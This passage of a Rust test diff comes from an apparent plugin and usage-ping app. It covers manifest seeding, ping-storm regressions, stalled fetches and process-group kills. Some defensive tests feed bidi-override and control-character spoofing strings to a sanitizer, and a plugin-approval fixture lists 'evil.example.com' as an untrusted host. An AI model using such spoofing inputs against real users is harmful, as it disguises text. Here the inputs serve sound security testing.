-        "Plugin id: {id}\nEngine: {engine}\nAuth chain: {auth_chain}\nDestination hosts: {dest_hosts}\n\
-         Allowed hosts: {allowed}\nReads local files: {local_files}\nRuns after a reset: {runs}\n\
+        "Plugin id: {id}\nEngine: {engine}\nAuth chain: {auth_chain}\nReads credentials from: \
+         {credential_sources_line}\nDestination hosts: {dest_hosts}\nAllowed hosts: {allowed}\n\
+         Reads local files: {local_files_line}\nRuns after a reset: {runs}\n\
          Redirects: 0 (blocked)"
     );
 
@@ -6947,6 +7603,14 @@ mod title_tests {
     /// `Absent` off an empty `dir`, treat that as a first install, and write
     /// `grok.toml` straight back — undoing the Remove the user just asked
     /// for.
+    ///
+    /// Runs the real launch sequence ([`seed_and_upgrade_builtins`], not
+    /// `upgrade_builtin_manifests` alone) on a `dir` with the other four
+    /// built-ins present and only `grok` missing — the shape a single Remove
+    /// actually leaves. `has_any_toml` would already have stood the seed step
+    /// down here even before the fix below (four files are still `*.toml`), so
+    /// this is the case the fix must not regress, not the one it fixes; the
+    /// next test is the one that fixes.
     #[test]
     fn removing_a_plugin_keeps_the_marker_so_the_seed_step_does_not_re_deliver_it() {
         let dir = std::env::temp_dir().join(format!(
@@ -6961,8 +7625,15 @@ mod title_tests {
             .find(|u| u.id == "grok")
             .expect("grok ships as a built-in");
 
-        // Settled at the current version, the way a real launch leaves it.
-        config::set_builtin_migrated("grok", grok.to_version);
+        // Settled at the current version for every built-in, the way a real
+        // launch leaves them — and the other four still have their file.
+        for upgrade in seed::BUILTIN_UPGRADES {
+            config::set_builtin_migrated(upgrade.id, upgrade.to_version);
+            if upgrade.id != "grok" {
+                std::fs::write(dir.join(upgrade.file), "# a settled built-in\n")
+                    .expect("existing manifest");
+            }
+        }
 
         // Remove: the plugin's generic keys go, but the migration marker must
         // survive it.
@@ -6975,11 +7646,83 @@ mod title_tests {
 
         // No `grok.toml` on disk — the user removed it. The next launch's
         // seed step must leave it that way.
-        upgrade_builtin_manifests(&dir);
+        seed_and_upgrade_builtins(&dir);
         assert!(
             !dir.join("grok.toml").exists(),
             "a plugin the user removed must not come back after Remove"
         );
+
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// The shape `has_any_toml` alone could not tell apart from a
+    /// never-seeded machine — every built-in removed at once, so `dir` holds
+    /// no `*.toml` at all. `seed_if_empty` used to read that emptiness as
+    /// "seed", undoing the removal in full on the very next launch. Runs the
+    /// real launch sequence, on an empty `dir`, with every marker already
+    /// settled — a fresh install's absence of markers is [`truly_fresh_install`]'s
+    /// own test below.
+    #[test]
+    fn removing_every_built_in_at_once_keeps_them_all_gone_on_the_next_launch() {
+        let dir = std::env::temp_dir().join(format!(
+            "tickover-remove-all-five-{}-{}",
+            std::process::id(),
+            now_unix()
+        ));
+        std::fs::create_dir_all(&dir).expect("temp dir");
+
+        // Settled at the current version, the way a real prior launch left
+        // them — and then the user removed every one of the five files.
+        for upgrade in seed::BUILTIN_UPGRADES {
+            config::set_builtin_migrated(upgrade.id, upgrade.to_version);
+        }
+        assert!(
+            !truly_fresh_install(),
+            "every built-in has a marker: this is a settled install, not a fresh one"
+        );
+
+        seed_and_upgrade_builtins(&dir);
+        for upgrade in seed::BUILTIN_UPGRADES {
+            assert!(
+                !dir.join(upgrade.file).exists(),
+                "{} must not come back: removing every manifest at once is still a removal",
+                upgrade.file
+            );
+        }
+
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// The other half: a machine that has genuinely never launched before —
+    /// no marker for any built-in — must still receive every one of them,
+    /// through the very same launch sequence the test above proves does
+    /// *not* re-deliver a removed one.
+    #[test]
+    fn a_truly_fresh_install_is_seeded_with_every_built_in() {
+        let dir = std::env::temp_dir().join(format!(
+            "tickover-fresh-install-{}-{}",
+            std::process::id(),
+            now_unix()
+        ));
+        std::fs::create_dir_all(&dir).expect("temp dir");
+        assert!(
+            truly_fresh_install(),
+            "a scratch config with no markers at all is what a fresh install looks like"
+        );
+
+        seed_and_upgrade_builtins(&dir);
+        for upgrade in seed::BUILTIN_UPGRADES {
+            assert!(
+                dir.join(upgrade.file).exists(),
+                "{} must reach a machine that has never made this decision before",
+                upgrade.file
+            );
+            assert_eq!(
+                config::builtin_migrated(upgrade.id).as_deref(),
+                Some(upgrade.to_version),
+                "the launch that seeds a built-in also settles its marker"
+            );
+        }
 
         std::fs::remove_dir_all(&dir).ok();
     }
@@ -7505,6 +8248,138 @@ mod title_tests {
         );
     }
 
+    /// A negative `used_percent` never reaches a real reading — both engines
+    /// clamp to 0..100 before a `Window` leaves them — but `ping_due` must not
+    /// quietly treat one as "extra empty" if some future engine, or a
+    /// hand-built test fixture, ever hands it one anyway: `== 0.0`, not
+    /// `<= 0.0`.
+    #[test]
+    fn ping_due_does_not_treat_a_negative_used_percent_as_empty() {
+        assert!(
+            !ping_due(Some(-5.0), Some(NOW + 300), FIVE_H, 0, 0, NOW),
+            "negative is not zero: a clamp failing upstream must not also fire the ping"
+        );
+        assert!(
+            ping_due(Some(0.0), Some(NOW + 300), FIVE_H, 0, 0, NOW),
+            "exactly zero is still the empty state this whole feature is for"
+        );
+    }
+
+    /// Replays consecutive one-second ticks of the auto-ping loop exactly as
+    /// `main`'s timer drives it: `pinged_at` starts unset and is advanced to
+    /// the tick's own `now` on every tick `ping_due` fires, never armed once
+    /// and left to fire later. Returns how many of the `ticks` starting at
+    /// `first_now` actually pinged — the number a storm would have run away
+    /// with, and the number [`PING_MIN_INTERVAL_SECS`] and `window_start`'s
+    /// bounds are meant to keep small.
+    fn replay_ticks(
+        used_percent: Option<f64>,
+        resets_at: Option<u64>,
+        period_minutes: Option<u64>,
+        seen_window: u64,
+        first_now: u64,
+        ticks: u64,
+    ) -> u64 {
+        let mut pinged_at = 0u64;
+        let mut fired = 0u64;
+        for i in 0..ticks {
+            let now = first_now + i;
+            if ping_due(
+                used_percent,
+                resets_at,
+                period_minutes,
+                seen_window,
+                pinged_at,
+                now,
+            ) {
+                fired += 1;
+                pinged_at = now;
+            }
+        }
+        fired
+    }
+
+    /// The storming regression the next two tests each name a shape of,
+    /// replayed rather than sampled: an honest five-hour window, empty the
+    /// moment it starts, ticked over its entire length one second at a time.
+    /// Exactly one ping — the one at the boundary — however many ticks that
+    /// boundary sits inside.
+    #[test]
+    fn a_full_honest_window_is_pinged_exactly_once_across_every_tick_inside_it() {
+        let start = NOW;
+        let reset = start + 5 * 3600;
+        let fired = replay_ticks(Some(0.0), Some(reset), FIVE_H, 0, start, reset - start);
+        assert_eq!(fired, 1, "one boundary, one ping, whatever the tick count");
+    }
+
+    /// One exact shape of that regression: a manifest whose `period.assumed`
+    /// (here fed straight in as `period_minutes`, as `ping_window` would
+    /// resolve it) is a single minute beside a real reset five hours out.
+    /// Pre-fix, `window_start` returned `reset − 60s` — a boundary far in the
+    /// future — without ever checking it against `now`, so `pinged_at`
+    /// chased that fixed point one tick behind forever: every tick from here
+    /// to a minute before the reset fired, on the order of 420 spawned pings
+    /// across just this 600-tick replay. Post-fix, `window_start` refuses a
+    /// `start` still ahead of `now`, so nothing fires until the real
+    /// boundary the bad arithmetic computed is actually reached — the last
+    /// minute before the reset — and then only once.
+    #[test]
+    fn an_implausibly_short_assumed_period_stops_storming_and_fires_once_near_the_true_reset() {
+        let reset = NOW + 5 * 3600;
+        let one_minute = Some(1u64);
+        let fired = replay_ticks(Some(0.0), Some(reset), one_minute, 0, reset - 600, 600);
+        assert_eq!(
+            fired, 1,
+            "the last minute before the reset is the only point `start` is ever reached"
+        );
+    }
+
+    /// The other shape of that regression: `resets_at` arriving in
+    /// milliseconds rather than seconds is still a valid `u64` — one about a
+    /// thousand times too large, placing the "reset" millennia away. Pre-fix
+    /// that read as a `start` just as far in the future, and the same
+    /// unchecked comparison that stormed above fired on every tick without
+    /// limit. Post-fix, `now` never reaches anywhere near that `start`, so
+    /// nothing fires at all.
+    #[test]
+    fn resets_at_in_milliseconds_never_fires_let_alone_storms() {
+        let bogus_reset = NOW * 1000;
+        let fired = replay_ticks(Some(0.0), Some(bogus_reset), FIVE_H, 0, NOW, 1000);
+        assert_eq!(
+            fired, 0,
+            "a reset millennia out is never inside the replayed span"
+        );
+    }
+
+    /// A `resets_at` that is merely absurd rather than a unit-confusion
+    /// artefact — no engine-side cap on how far ahead a stated reset may be
+    /// (that cap, if any, is a different package's concern) — must not storm
+    /// either: `window_start`'s own bound on `start` catches it regardless of
+    /// why the value is wrong.
+    #[test]
+    fn a_far_future_resets_at_never_fires_let_alone_storms() {
+        let hundred_years = 100 * 365 * 24 * 3600;
+        let bogus_reset = NOW + hundred_years;
+        let fired = replay_ticks(Some(0.0), Some(bogus_reset), FIVE_H, 0, NOW, 1000);
+        assert_eq!(
+            fired, 0,
+            "a reset a century out is never inside the replayed span"
+        );
+    }
+
+    /// A `pinged_at` from the future — reachable only by a hand-edited
+    /// config.json, since nothing this app writes is ever ahead of its own
+    /// clock — is read as "pinged just now", the same state a real ping
+    /// firing this instant would leave, rather than compared as itself
+    /// against an otherwise-due window.
+    #[test]
+    fn a_pinged_at_from_the_future_is_read_as_pinged_just_now() {
+        assert!(
+            !ping_due(Some(0.0), Some(NOW + 300), FIVE_H, 0, NOW + 10_000, NOW),
+            "clamped to now rather than compared as a value already past the window's start"
+        );
+    }
+
     /// A Codex-shaped manifest: a `[ping]` and one primary window whose length
     /// comes out of the response, so there is none to be had when the provider
     /// reports nothing. Deliberately the only window it declares — the weekly
@@ -7781,6 +8656,29 @@ mod title_tests {
         assert_eq!(
             data.notice, "",
             "no refusal is drawn beside an error we invented nothing for"
+        );
+    }
+
+    /// `error` is not this app's own text — a manifest's `reject-when`
+    /// message, a keychain `service` name, or a `no_credentials_message` all
+    /// reach it verbatim from the manifest that declared them, so the panel
+    /// must never draw one raw.
+    #[test]
+    fn an_errored_readings_message_is_sanitized_before_it_reaches_the_panel() {
+        let mut broken = reading_with(Vec::new(), None);
+        broken.fail("no \u{202E}credentials\n found\u{200B}");
+
+        let data = provider_data_from_reading(&broken, ModelRc::default(), ModelRc::default());
+        assert_eq!(
+            data.message,
+            tickover::plugin::sanitize_provider_text("no \u{202E}credentials\n found\u{200B}"),
+        );
+        assert!(
+            !data.message.contains('\u{202E}')
+                && !data.message.contains('\n')
+                && !data.message.contains('\u{200B}'),
+            "the sink, not just the sanitizer, is what this test holds to: {}",
+            data.message
         );
     }
 
@@ -8786,23 +9684,30 @@ mod title_tests {
             period_minutes: Some(300),
         };
 
-        let knows_nothing = seen_writes(seen_records(&plugins, &readings), |_, _, _| None);
+        let knows_nothing = seen_writes(seen_records(&plugins, &readings), |_, _, _| None, NOW);
         assert_eq!(
             knows_nothing.iter().map(|w| w.seen).collect::<Vec<_>>(),
             vec![stated],
             "a boundary nothing has recorded yet is written"
         );
 
-        let knows_it = seen_writes(seen_records(&plugins, &readings), |_, _, _| Some(stated));
+        let knows_it = seen_writes(
+            seen_records(&plugins, &readings),
+            |_, _, _| Some(stated),
+            NOW,
+        );
         assert!(knows_it.is_empty(), "and the same one again is not");
 
-        let knows_it_without_a_length =
-            seen_writes(seen_records(&plugins, &readings), |_, _, _| {
+        let knows_it_without_a_length = seen_writes(
+            seen_records(&plugins, &readings),
+            |_, _, _| {
                 Some(config::SeenWindow {
                     at: stated.at,
                     period_minutes: None,
                 })
-            });
+            },
+            NOW,
+        );
         assert_eq!(
             knows_it_without_a_length
                 .iter()
@@ -8829,6 +9734,7 @@ mod title_tests {
         let out = seen_writes(
             seen_records(&plugins, &reading(vec![newer.clone(), older.clone()])),
             |_, _, _| None,
+            NOW,
         );
         assert_eq!(
             out.iter().map(|w| w.seen.at).collect::<Vec<_>>(),
@@ -8839,6 +9745,7 @@ mod title_tests {
         let out = seen_writes(
             seen_records(&plugins, &reading(vec![older, newer])),
             |_, _, _| None,
+            NOW,
         );
         assert_eq!(
             out.iter().map(|w| w.seen.at).collect::<Vec<_>>(),
@@ -8922,24 +9829,25 @@ mod title_tests {
             ..stored
         };
         assert_eq!(
-            seen_merge(None, stored),
+            seen_merge(None, stored, NOW),
             Some(stored),
             "nothing remembered yet"
         );
-        assert_eq!(seen_merge(Some(stored), newer), Some(newer));
+        assert_eq!(seen_merge(Some(stored), newer, NOW), Some(newer));
         assert_eq!(
             seen_merge(
                 Some(stored),
                 config::SeenWindow {
                     at: NOW - 1,
                     ..stored
-                }
+                },
+                NOW
             ),
             None,
             "a stale reading"
         );
         assert_eq!(
-            seen_merge(Some(stored), stored),
+            seen_merge(Some(stored), stored, NOW),
             None,
             "the same window again costs no write"
         );
@@ -8964,7 +9872,8 @@ mod title_tests {
                 config::SeenWindow {
                     at: NOW + 5 * 3600,
                     period_minutes: None
-                }
+                },
+                NOW
             ),
             Some(config::SeenWindow {
                 at: NOW + 5 * 3600,
@@ -8978,7 +9887,8 @@ mod title_tests {
                 config::SeenWindow {
                     at: NOW,
                     period_minutes: None
-                }
+                },
+                NOW
             ),
             None,
             "and the same window with nothing new costs no write"
@@ -8992,7 +9902,8 @@ mod title_tests {
                 config::SeenWindow {
                     at: NOW,
                     period_minutes: Some(300)
-                }
+                },
+                NOW
             ),
             Some(stored),
             "but a length arriving for the window already remembered is worth the write"
@@ -9003,13 +9914,110 @@ mod title_tests {
                 config::SeenWindow {
                     at: NOW + 1,
                     period_minutes: Some(600)
-                }
+                },
+                NOW
             ),
             Some(config::SeenWindow {
                 at: NOW + 1,
                 period_minutes: Some(600)
             }),
             "a length the provider actually states still replaces the old one"
+        );
+    }
+
+    /// The shape that used to poison the registry for good — one
+    /// implausible `resets_at` (milliseconds instead of seconds, or a
+    /// manifest arithmetic bug), recorded once, then defended forever by the
+    /// forward-only rule against every honest reading that came after it,
+    /// since none of them could ever be "newer" than a fake reset years out.
+    #[test]
+    fn seen_merge_refuses_an_implausible_new_reset() {
+        let five_hour = Some(300u64); // period_minutes, minutes
+        let implausible = NOW + 400 * 24 * 3600; // over a year out
+        assert_eq!(
+            seen_merge(
+                None,
+                config::SeenWindow {
+                    at: implausible,
+                    period_minutes: five_hour
+                },
+                NOW
+            ),
+            None,
+            "nothing remembered yet is no excuse to remember something absurd"
+        );
+        assert_eq!(
+            seen_merge(
+                Some(config::SeenWindow {
+                    at: NOW,
+                    period_minutes: five_hour
+                }),
+                config::SeenWindow {
+                    at: implausible,
+                    period_minutes: five_hour
+                },
+                NOW
+            ),
+            None,
+            "an honest stored value is not overwritten by a bogus one either"
+        );
+    }
+
+    /// The other half of that: once an implausible value has already been
+    /// recorded — by a build before this rule existed, or by a bug this rule
+    /// does not yet cover — the very next honest reading has to be able to
+    /// replace it, even though "honest" here means *smaller* than what is
+    /// stored, which the ordinary forward-only rule would refuse.
+    #[test]
+    fn seen_merge_lets_a_smaller_honest_value_recover_from_an_implausible_stored_one() {
+        let five_hour = Some(300u64);
+        let poisoned = config::SeenWindow {
+            at: NOW + 1000 * 24 * 3600,
+            period_minutes: five_hour,
+        };
+        let honest = config::SeenWindow {
+            at: NOW + 3600,
+            period_minutes: five_hour,
+        };
+        assert_eq!(
+            seen_merge(Some(poisoned), honest, NOW),
+            Some(honest),
+            "a plausible reading recovers the registry from one that was not"
+        );
+        // And once recovered, the ordinary forward-only rule is back in
+        // force: a second honest reading no older than the first still wins,
+        // but nothing moves the boundary backward from here.
+        assert_eq!(
+            seen_merge(Some(honest), config::SeenWindow { at: NOW, ..honest }, NOW),
+            None,
+            "recovered once, the registry is not still forgiving of a stale one"
+        );
+    }
+
+    /// The 8-day ceiling stands in for "two periods" when no period has ever
+    /// been stated for this window — there is nothing else to judge it by.
+    #[test]
+    fn seen_merge_falls_back_to_an_eight_day_ceiling_without_a_known_period() {
+        assert_eq!(
+            seen_merge(
+                None,
+                config::SeenWindow {
+                    at: NOW + 30 * 24 * 3600,
+                    period_minutes: None
+                },
+                NOW
+            ),
+            None,
+            "thirty days out with no period stated is past the fallback ceiling"
+        );
+        let within = config::SeenWindow {
+            at: NOW + 7 * 24 * 3600,
+            period_minutes: None,
+        };
+        assert_eq!(
+            seen_merge(None, within, NOW),
+            Some(within),
+            "seven days out is inside it — Codex's own weekly window is this long"
         );
     }
 
@@ -9226,9 +10234,14 @@ mod title_tests {
 
     /// A fetch that hangs used to mark its plugin in-flight for the life of
     /// the process: no panic, no error, just a row that stopped changing and
-    /// was never polled again. Patience runs out instead.
+    /// was never polled again. Past `FETCH_PATIENCE` this app now says so —
+    /// `Admission::Stalled`, not `Replace`: a thread cannot be killed, so
+    /// a "replacement" only ever ran *beside* the original, doubling a
+    /// log-file engine's own walk every `FETCH_PATIENCE` for as long as it
+    /// stayed stuck. `spawn_plugin_fetch` treats `Stalled` exactly like
+    /// `Wait` — see the test below for that half.
     #[test]
-    fn admit_fetch_waits_on_a_live_fetch_and_replaces_a_hung_one() {
+    fn admit_fetch_waits_on_a_live_fetch_and_calls_out_a_hung_one() {
         let patience = Duration::from_secs(600);
         assert_eq!(
             admit_fetch(None, patience),
@@ -9242,13 +10255,72 @@ mod title_tests {
         );
         assert_eq!(
             admit_fetch(Some(patience), patience),
-            Admission::Replace,
-            "at the limit, stop waiting"
+            Admission::Stalled,
+            "at the limit, worth saying so"
         );
         assert_eq!(
             admit_fetch(Some(Duration::from_secs(4 * 3600)), patience),
-            Admission::Replace,
-            "and long past it"
+            Admission::Stalled,
+            "and long past it — still never a second thread"
+        );
+    }
+
+    /// The same stall, at the level `admit_fetch`'s own test cannot see: past
+    /// `FETCH_PATIENCE`, `spawn_plugin_fetch` must not insert a fresh
+    /// `InFlight` (which would let a second background thread start), must
+    /// log the stall exactly once no matter how many ticks find it still
+    /// stalled, and must leave the original fetch's `generation` untouched —
+    /// so whenever it does eventually answer, its result still lands.
+    #[test]
+    fn spawn_plugin_fetch_never_starts_a_second_thread_for_a_stalled_one() {
+        let m = stub_manifest("stalled", 10);
+        let fetching: Fetching = Rc::new(RefCell::new(HashMap::new()));
+        let original_generation = 42;
+        fetching.borrow_mut().insert(
+            m.id.clone(),
+            InFlight {
+                generation: original_generation,
+                started: Instant::now() - FETCH_PATIENCE - Duration::from_secs(1),
+                stall_logged: false,
+            },
+        );
+        let (tx, _rx) = mpsc::channel();
+        let _ = diag::take_recorded();
+
+        spawn_plugin_fetch(&m, vec![], BTreeMap::new(), &tx, &fetching);
+
+        let after_first = fetching
+            .borrow()
+            .get(&m.id)
+            .copied()
+            .expect("still tracked");
+        assert_eq!(
+            after_first.generation, original_generation,
+            "the original fetch is still the one being waited on"
+        );
+        assert!(
+            after_first.stall_logged,
+            "the stall is now marked, so a second tick will not log it again"
+        );
+        let first_log = diag::take_recorded();
+        assert!(
+            first_log
+                .iter()
+                .any(|l| l.contains("stalled") && l.contains("not starting another")),
+            "expected the stall logged once: {first_log:?}"
+        );
+
+        // A second tick, still stalled: no second line, no new generation.
+        spawn_plugin_fetch(&m, vec![], BTreeMap::new(), &tx, &fetching);
+        let after_second = fetching
+            .borrow()
+            .get(&m.id)
+            .copied()
+            .expect("still tracked");
+        assert_eq!(after_second.generation, original_generation);
+        assert!(
+            diag::take_recorded().is_empty(),
+            "the second tick must not log the same stall again"
         );
     }
 
@@ -9260,6 +10332,7 @@ mod title_tests {
         let in_flight = InFlight {
             generation: 7,
             started: Instant::now(),
+            stall_logged: false,
         };
         assert!(
             result_is_current(Some(in_flight), 7),
@@ -9278,10 +10351,17 @@ mod title_tests {
     /// A real child process for the `run_with_deadline` cases below. `sh` is
     /// present on every platform this test module runs on (the tests are
     /// `cfg(unix)`, since a Windows shell would need a different script).
+    /// `process_group(0)` mirrors what `spawn_hello` sets on the real ping
+    /// command — without it,
+    /// `run_with_deadline_kills_a_command_that_outlives_it_and_its_child`
+    /// below would prove nothing about `kill_process_tree` reaching a
+    /// grandchild, since there would be no group for it to join.
     #[cfg(unix)]
     fn sh(script: &str) -> std::process::Child {
+        use std::os::unix::process::CommandExt;
         std::process::Command::new("/bin/sh")
             .args(["-c", script])
+            .process_group(0)
             .stdin(std::process::Stdio::null())
             .stdout(std::process::Stdio::null())
             .stderr(std::process::Stdio::piped())
@@ -9320,6 +10400,53 @@ mod title_tests {
         );
     }
 
+    /// A plain `child.kill()` only ever reaches `/bin/sh` itself — the
+    /// `sleep` it backgrounds and waits on lives in the same process group
+    /// `sh()` sets up above, and outlives the deadline right along with its
+    /// parent unless the whole group is killed. Proven directly rather than
+    /// inferred from the parent's own exit: the grandchild's pid is recorded
+    /// to a file before the shell blocks on `wait`, then polled after the
+    /// deadline fires until `kill(pid, 0)` reports it gone.
+    #[cfg(unix)]
+    #[test]
+    fn run_with_deadline_kills_a_command_that_outlives_it_and_its_grandchild() {
+        let pidfile = std::env::temp_dir().join(format!(
+            "tickover-test-grandchild-pid-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0)
+        ));
+        let script = format!("sleep 30 & echo $! > {}; wait", pidfile.display());
+        let (outcome, _) = run_with_deadline(sh(&script), Duration::from_millis(300));
+        assert!(matches!(outcome, RunOutcome::Killed), "got {outcome:?}");
+
+        let grandchild_pid: libc::pid_t = std::fs::read_to_string(&pidfile)
+            .expect("the script had time to record its background pid before the deadline")
+            .trim()
+            .parse()
+            .expect("a plain pid number");
+        std::fs::remove_file(&pidfile).ok();
+
+        let deadline = Instant::now() + Duration::from_secs(3);
+        loop {
+            // Signal 0 sends nothing; it only reports whether the pid is
+            // still ours to signal. A momentarily-still-alive zombie,
+            // waiting on its now-dead parent to be reaped by init, is why
+            // this polls rather than checking once.
+            let alive = unsafe { libc::kill(grandchild_pid, 0) } == 0;
+            if !alive {
+                break;
+            }
+            assert!(
+                Instant::now() < deadline,
+                "the grandchild ({grandchild_pid}) outlived the group kill"
+            );
+            std::thread::sleep(Duration::from_millis(50));
+        }
+    }
+
     /// A command that writes more than we keep must still run to completion:
     /// closing the pipe early would kill it, turning "warned a lot" into a
     /// failed ping. And what survives is the **tail** — a CLI that fails says
@@ -9345,18 +10472,56 @@ mod title_tests {
         );
     }
 
-    /// The one property that matters more than which directory this picks:
-    /// it is never `$HOME`, no matter which of the two attempts succeeded.
-    /// Handing an unwatched, output-discarded model run the user's real home
-    /// directory as its working directory is the prompt-injection surface
-    /// `ping_cwd` exists to close.
+    /// Not merely unequal to `$HOME` — not a *descendant* of it either.
+    /// The old shared `ping-workdir` sat right beside `config.json`, several
+    /// levels under `$HOME` but never equal to it, so an `assert_ne!` here
+    /// passed on that design too and proved nothing about the walk-up-parents
+    /// prompt-injection surface `ping_cwd` exists to close. `expect`, not
+    /// `if let Some`, on `home_dir()`: a test environment with no resolvable
+    /// home is the one case this property can't even be asked about, and
+    /// silently skipping the assertion is how the same mistake happens twice.
     #[test]
     fn ping_cwd_is_never_the_home_directory() {
         let cwd = ping_cwd().expect("one of the two attempts succeeds in a test environment");
         assert!(cwd.exists(), "the returned directory must already exist");
-        if let Some(home) = dirs::home_dir() {
-            assert_ne!(cwd, home, "the ping's cwd must never be $HOME");
-        }
+        let home = dirs::home_dir().expect("a test environment has a resolvable home directory");
+        assert!(
+            !cwd.starts_with(&home),
+            "the ping's cwd must never be $HOME or a descendant of it: {} is under {}",
+            cwd.display(),
+            home.display()
+        );
+        std::fs::remove_dir_all(&cwd).ok();
+    }
+
+    /// A directory created for one run must not still be there for the
+    /// next one — two calls get two different, both-freshly-created paths,
+    /// never the same reused directory an earlier run (or something else
+    /// entirely) could have left a file in.
+    #[test]
+    fn ping_cwd_creates_a_distinct_directory_on_every_call() {
+        let first = ping_cwd().expect("first call creates a directory");
+        let second = ping_cwd().expect("second call creates a directory");
+        assert_ne!(
+            first, second,
+            "reusing one directory across runs is the gap a fresh one per run closes"
+        );
+        assert!(first.exists() && second.exists());
+        std::fs::remove_dir_all(&first).ok();
+        std::fs::remove_dir_all(&second).ok();
+    }
+
+    /// `0o700` from the moment the directory exists, not applied
+    /// afterwards — there is no window in which anything else running as this
+    /// user could have read it at a looser mode.
+    #[test]
+    #[cfg(unix)]
+    fn ping_cwd_creates_the_directory_owner_only() {
+        use std::os::unix::fs::PermissionsExt;
+        let cwd = ping_cwd().expect("a directory is created");
+        let mode = std::fs::metadata(&cwd).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o700, "got mode {mode:o}");
+        std::fs::remove_dir_all(&cwd).ok();
     }
 
     /// The quoted stderr of a failed ping is cut by characters, because a
@@ -9395,6 +10560,11 @@ mod title_tests {
     /// true exactly when this is running as part of an unwind, never on the
     /// ordinary "finished, sent, dropped" path, so the line only appears when
     /// it means something.
+    ///
+    /// This proves the guard's behavior under unwinding, which is what a
+    /// `cargo test` binary always uses and, since this crate does not set
+    /// `panic = "abort"`, what the shipped binary uses too — see
+    /// [`FetchGuard`]'s own doc for why that guarantee is worth stating.
     #[test]
     fn fetch_guard_logs_when_dropped_mid_panic() {
         diag::take_recorded();
@@ -9531,6 +10701,44 @@ mod title_tests {
         assert_eq!(
             out.iter().map(|m| m.id.as_str()).collect::<Vec<_>>(),
             vec!["alpha", "beta"]
+        );
+    }
+
+    /// Distinct plugin ids can still spell the same reading id — plugin
+    /// `claude-cli`'s default surface and plugin `claude`'s `cli` surface both
+    /// produce `"claude-cli"`. Left in, both would file readings under the
+    /// same window-model cache slot; this is what keeps that from ever
+    /// happening rather than merely logging that it did.
+    #[test]
+    fn dedup_plugin_ids_drops_a_later_plugin_whose_reading_id_collides_with_an_earlier_ones() {
+        let claude = claude_like_two_surface_manifest(); // id "claude", order 20, surface "cli"
+        let impostor = stub_manifest("claude-cli", 30); // default surface reads as "claude-cli" too
+        assert_eq!(
+            surface_reading_id("claude", "cli"),
+            "claude-cli",
+            "the collision this test is about"
+        );
+
+        let out = dedup_plugin_ids(vec![claude, impostor]);
+        assert_eq!(
+            out.iter().map(|m| m.id.as_str()).collect::<Vec<_>>(),
+            vec!["claude"],
+            "the earlier-loaded manifest (by order) keeps its reading id; the later one is dropped whole"
+        );
+    }
+
+    /// The collision is symmetric in spelling but not in outcome: whichever
+    /// manifest sorts first survives, whichever surface of it happens to
+    /// produce the shared reading id.
+    #[test]
+    fn dedup_plugin_ids_reading_id_collision_keeps_whichever_manifest_loads_first() {
+        let impostor = stub_manifest("claude-cli", 5); // now the lower order
+        let claude = claude_like_two_surface_manifest(); // order 20
+        let out = dedup_plugin_ids(vec![impostor, claude]);
+        assert_eq!(
+            out.iter().map(|m| m.id.as_str()).collect::<Vec<_>>(),
+            vec!["claude-cli"],
+            "order, not which plugin id looks more legitimate, decides the winner"
         );
     }
 
@@ -9794,6 +11002,42 @@ mod title_tests {
         assert_eq!(plugin_row(&m).current_version.as_str(), "2.3.4");
     }
 
+    /// An argument containing whitespace, joined onto the others by a
+    /// bare space, would read as more than one argument — `["say", "hello
+    /// world"]` displayed no differently than `["say", "hello", "world"]`.
+    #[test]
+    fn ping_command_line_quotes_an_argument_that_contains_whitespace() {
+        let ping = manifest::PingConfig {
+            bin: "codex".to_string(),
+            args: vec!["exec".to_string(), "say hello".to_string()],
+        };
+        assert_eq!(ping_command_line(&ping), "codex exec \"say hello\"");
+    }
+
+    #[test]
+    fn ping_command_line_leaves_ordinary_arguments_unquoted() {
+        let ping = manifest::PingConfig {
+            bin: "codex".to_string(),
+            args: vec!["exec".to_string(), "hello".to_string()],
+        };
+        assert_eq!(ping_command_line(&ping), "codex exec hello");
+    }
+
+    /// An argument that already carries a `"` is quoted (not left to look
+    /// like it closes a neighbour's) with that quote escaped, so the pair
+    /// added around the whole argument are unambiguously the outer ones.
+    #[test]
+    fn ping_command_line_escapes_a_quote_already_inside_an_argument() {
+        let ping = manifest::PingConfig {
+            bin: "codex".to_string(),
+            args: vec!["say".to_string(), "a \"quoted\" word".to_string()],
+        };
+        assert_eq!(
+            ping_command_line(&ping),
+            "codex say \"a \\\"quoted\\\" word\""
+        );
+    }
+
     fn make_registry_entry(id: &str, name: &str, version: &str, sha256: &str) -> RegistryEntry {
         RegistryEntry {
             id: id.to_string(),
@@ -9854,6 +11098,28 @@ mod title_tests {
         );
         assert_eq!(diff.new_rows[0].status, 0);
         assert_eq!(diff.new_rows[0].error.as_str(), "");
+    }
+
+    /// `name`/`description` come off whatever host serves the registry's
+    /// `index.toml` — this build's own, or a third-party one the user pointed
+    /// it at — so a control character or a bidi override in either must never
+    /// reach the plugin-manager row raw.
+    #[test]
+    fn registry_entry_row_sanitizes_name_and_description() {
+        let mut entry = make_registry_entry("acme", "Acme\nProvider\u{202E}", "1.0.0", "deadbeef");
+        entry.description = Some("reads\u{200B}your\ncredentials".to_string());
+
+        let row = registry_entry_row(&entry);
+        assert_eq!(
+            row.name.as_str(),
+            tickover::plugin::sanitize_provider_text("Acme\nProvider\u{202E}")
+        );
+        assert_eq!(
+            row.description.as_str(),
+            tickover::plugin::sanitize_provider_text("reads\u{200B}your\ncredentials")
+        );
+        assert!(!row.name.contains('\n') && !row.name.contains('\u{202E}'));
+        assert!(!row.description.contains('\n') && !row.description.contains('\u{200B}'));
     }
 
     #[test]
@@ -9968,6 +11234,7 @@ mod title_tests {
             ],
             untrusted_hosts: vec!["evil.example.com".to_string()],
             local_files: Vec::new(),
+            credential_sources: vec!["keychain \"svc\"".to_string()],
             ping: None,
             requires_approval: true,
         };
@@ -9976,6 +11243,10 @@ mod title_tests {
 
         assert!(short.contains("some-plugin"), "short: {short}");
         assert!(short.contains("credentials-file"), "short: {short}");
+        assert!(
+            short.contains("keychain \"svc\""),
+            "the first screen names the credential source, not just the step kind: {short}"
+        );
 
         assert!(
             detailed.contains("Plugin id: some-plugin"),
@@ -9987,6 +11258,10 @@ mod title_tests {
         );
         assert!(
             detailed.contains("credentials-file → keychain"),
+            "detailed: {detailed}"
+        );
+        assert!(
